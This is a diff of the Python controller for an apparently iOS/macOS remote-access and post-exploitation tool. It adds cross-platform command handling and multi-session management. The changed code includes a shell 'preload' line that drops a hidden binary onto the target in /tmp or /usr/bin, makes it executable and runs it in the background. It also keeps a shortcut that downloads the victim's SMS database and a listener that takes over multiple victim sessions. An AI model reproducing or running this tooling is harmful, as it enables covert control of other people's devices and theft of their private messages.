@@ -23,8 +23,11 @@ escrypt = ESEncryptor(shellKey,16)
 datadir = "data"
 sessions = {}
 
+#Mark: Mode
+#either "single", "multi", or "none"
+AMODE = "none"
 #MARK: UI
-iswin = sys.platform.startswith('win')
+iswin = sys.platform.startswith('win') or sys.platform.startswith('darwin')
 RED = '' if iswin else '\033[1;91m'
 ENDC = '' if iswin else '\033[0m'
 UNDERLINE_GREEN = '' if iswin else '\033[4;92m'
@@ -52,6 +55,13 @@ BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
     4): Exit
 """ + WHITE + "-"*40
 BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
+#MARK: OS Commands
+#iswin is already in UI part, but that has ios in it
+iswin = sys.platform.startswith('win')
+CMD_CLEAR = 'cls' if iswin else 'clear'
+CMD_LS = 'dir' if iswin else 'ls'
+#Windows is so weird with its commands.
+CMD_PWD = 'cd' if iswin else 'pwd'
 
 iosshortcuts = {
     "getsms":"download /var/mobile/Library/SMS/sms.db",
@@ -61,7 +71,7 @@ iosshortcuts = {
 
 def interactiveMenu():
     while 1:
-        os.system('clear')
+        os.system(CMD_CLEAR)
         option = raw_input(BANNER)
         choose = {
             "1" : menuStartServer,
@@ -71,7 +81,7 @@ def interactiveMenu():
         }
         try:
             choose[option]()
-            os.system('clear')
+            os.system(CMD_CLEAR)
         except KeyError:
             continue
 
@@ -104,6 +114,9 @@ def bbde(data):
 
 def showLocalHelp():
     print WHITEBU+"Local Commands (Do not work on windows):"+"\n"+ENDC
+    if AMODE == "multi":
+        showCommand("back", "detach from session")
+        showCommand("exit", "detach and close session")
     showCommand("lls","list contents of local directory")
     showCommand("lcd","change local directories")
     showCommand("lpwd","get current local directory")
@@ -193,13 +206,16 @@ def lopen(command):
     if len(command.split()) == 1:
         print "Usage: lopen localdirectory"
     else:
-        os.system('open ' + command.replace("lopen ",""))
+        if iswin:
+            print "Not supported on windows."
+        else:
+            os.system('open ' + command[5:])
 
 def lls(command):
     if len(command.split()) == 1:
-        os.system('ls')
+        os.system(CMD_LS)
     else:
-        os.system('ls ' + command.replace("lls ",""))
+        os.system(CMD_LS + " " + command[len(CMD_LS)+1:])
 
 def lcd(command):
     if len(command.split()) == 1:
@@ -255,7 +271,7 @@ def initSHELL(name,conn,host,port,CDA):
         elif args[0] == "help":
             showHelp(CDA)
         elif args[0] == "clear":
-            os.system('clear');
+            os.system(CMD_CLEAR);
         elif args[0] == "lopen":
             lopen(command)
             continue
@@ -266,7 +282,7 @@ def initSHELL(name,conn,host,port,CDA):
             lcd(command)
             continue
         elif args[0] == "lpwd":
-            os.system('pwd')
+            os.system(CMD_PWD)
             continue
         elif args[0] == "alert":
             title = bben(raw_input("Set title: "))
@@ -407,6 +423,7 @@ def getip():
         return "127.0.0.1"
 
 def singleServer(host,port):
+    AMODE = "single"
     session = SessionHandler()
     try:
         session.listen(1,host,port)
@@ -428,7 +445,7 @@ def promptHostPort():
     print strinfo("LHOST = " + lhost)
     portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
     if portChoice != "":
-		lport = portChoice
+        lport = portChoice
     print strinfo("LPORT = " + str(lport))
     return [lhost,lport]
 
@@ -520,8 +537,8 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-			#TODO: change upload directory for mobile user
-            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+            #TODO: change upload directory for mobile user
+            preload = "export dti='/tmp/'; if [ $UID == '0' ]; then export dti='/usr/bin/'; fi;rm $dti'espl' 2> /dev/null;cat >$dti'espl';chmod +x $dti'espl';$dti'espl' "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
@@ -567,10 +584,11 @@ def delayfive(s):
     time.sleep(5)
     s.close()
     s.close()
-			
+            
 #MARK: MultiServer
 
 def multiServer(host,port):
+    AMODE = "multi"
     x = 1
     strinfo("Starting Background Multi Server on "+str(port)+"...")
     print "type \"help\" for MultiServer commands"
@@ -583,27 +601,31 @@ def multiServer(host,port):
                 newsession.conn.close()
                 skip = 1
                 continue
+        sessions[x] = newsession
+        try:
+            newsession.conn.getpeername()[0]
+        except:
+            del sessions[x]
+            skip = 1
         if skip:
             continue
-        sessions[x] = newsession
-        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] +
-                         WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
+        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] + WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
         sys.stdout.flush()
         x += 1
 
-		
+        
 def multiServerSessionInteract(args):
     if len(args) == 2:
         try:
             s = sessions[int(args[1])]
             try:
-				s.conn.getpeername()[0]
-				if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
-					multiServerSessionClose(args)
+                s.conn.getpeername()[0]
+                if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
+                    multiServerSessionClose(args)
             except:
                 del sessions[int(args[1])]
         except:
-			print strinfo("Session not found")
+            print strinfo("Session not found")
 
 def multiServerSessionClose(args):
     if len(args) == 2:
@@ -636,7 +658,8 @@ def multiServerExit(bgserver):
             except:
                 pass
     sessions.clear()
-    exit()
+    AMODE = "none"
+    interactiveMenu()
 
 
 def multiServerHelp():
@@ -644,11 +667,12 @@ def multiServerHelp():
     showCommand("interact","interact with session, Usage: interact (session number)")
     showCommand("close","close session, Usage: close (session number)")
     showCommand("sessions","list current active sessions")
-    showCommand("back","go back to MultiSession menu from session")
+    showCommand("exit","exit MultiServer")
     print ""
 
 def multiServerController(port,bgserver):
-    while 1:
+    AMODE = "multi"
+    while AMODE == "multi":
         input = raw_input(WHITE+""+COLOR_INFO+"MultiSession"+WHITE+"> ")
         if not input:
             continue
